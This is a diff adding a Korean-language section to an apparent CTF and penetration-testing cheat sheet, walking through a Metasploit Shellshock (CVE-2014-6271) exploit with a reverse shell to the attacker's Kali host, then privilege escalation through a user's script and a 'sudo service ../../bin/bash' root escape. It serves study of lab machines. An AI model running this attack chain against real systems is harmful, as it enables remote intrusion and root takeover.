@@ -198,6 +198,68 @@ ssh user@192.168.1.100 -p 포트번호
 
 ---
 
+### 💥 10. Metasploit — Shellshock 공격 (CVE-2014-6271)
+
+> CGI 스크립트가 bash를 호출하는 환경에서 환경변수 인젝션으로 RCE 달성
+
+```bash
+sudo msfconsole
+
+# Shellshock 모듈 검색 및 선택
+search shellshock
+use 1
+
+# 옵션 설정
+set rhost 172.16.11.229          # 공격 대상 CTF 서버 IP
+set targeturi /cgi-bin/shell.sh  # 취약한 CGI 스크립트 경로 (필수!)
+set lhost 172.16.11.213          # 공격자(Kali) IP — 리버스 쉘 수신
+set lport 4545                   # 포트 바인딩 에러 방지용 포트 변경
+
+exploit
+```
+
+**Meterpreter → 일반 쉘 안정화:**
+
+```bash
+# 1. Meterpreter에서 일반 쉘 진입
+meterpreter > shell
+
+# 2. 쉘 안정화 (프롬프트가 안 나와도 바로 입력)
+SHELL=/bin/bash script -q /dev/null
+```
+
+**thor 계정을 통한 권한 상승:**
+
+```bash
+# thor의 hammer.sh 스크립트 실행 (sudo -u로 타 계정 권한 빌리기)
+sudo -u thor /home/thor/./hammer.sh
+
+# 프롬프트 대응
+Enter Thor Secret Key :            # thor 입력 후 엔터
+Please enter your Secret massage : # bash 입력 후 엔터
+# → thor의 bash 쉘 획득
+```
+
+**service 바이너리를 이용한 root 권한 상승:**
+
+```bash
+sudo -l
+# 출력 예시:
+# (root) NOPASSWD: /usr/sbin/service
+# 해석: service 명령어를 root 권한으로 비밀번호 없이 실행 가능
+
+# GTFOBins 기법 — service로 root 쉘 탈출
+sudo service ../../bin/bash
+
+whoami   # root 확인
+cd /root
+ls       # proof.txt 확인!
+```
+
+> 💡 `sudo service ../../bin/bash` 원리: `service`는 내부적으로 경로를 조합해 실행하는데, `../` 트래버설로 `/bin/bash`를 root 권한으로 직접 실행시킬 수 있음. → [GTFOBins: service](https://gtfobins.github.io/gtfobins/service/)
+
+---
+
 ### 🔖 북마크 필수 사이트
 
 | 사이트 | 용도 |
